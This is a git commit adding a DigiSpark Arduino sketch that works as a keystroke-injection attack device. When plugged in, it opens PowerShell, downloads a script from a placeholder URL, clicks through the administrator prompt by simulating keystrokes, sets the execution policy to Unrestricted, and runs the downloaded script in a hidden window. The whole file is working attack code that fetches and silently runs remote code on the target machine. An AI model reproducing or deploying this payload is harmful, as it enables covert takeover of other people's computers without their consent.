a60993be15846887e91449043d3de13b0b22ade5
zeykafx <37271973+zeykafx@users.noreply.github.com>
2018-11-18 20:57:42 +0100

    Improved execute powershell script

---
+++ Execute_Powershell_Script_V2.ino
@@ -0,0 +1,55 @@
+//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.delay(900);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(900);
+  DigiKeyboard.print("$client.DownloadFile(\"URL OF THE SCRIPT\" , \"NAME OF THE SCRIPT\")");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print(F("powershell Start-Process cmd -Verb runAs"));
+  DigiKeyboard.delay(900);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(800);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(900);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("cmd"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\NAME OF THE SCRIPT");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*empty*/
+  }
+
+}
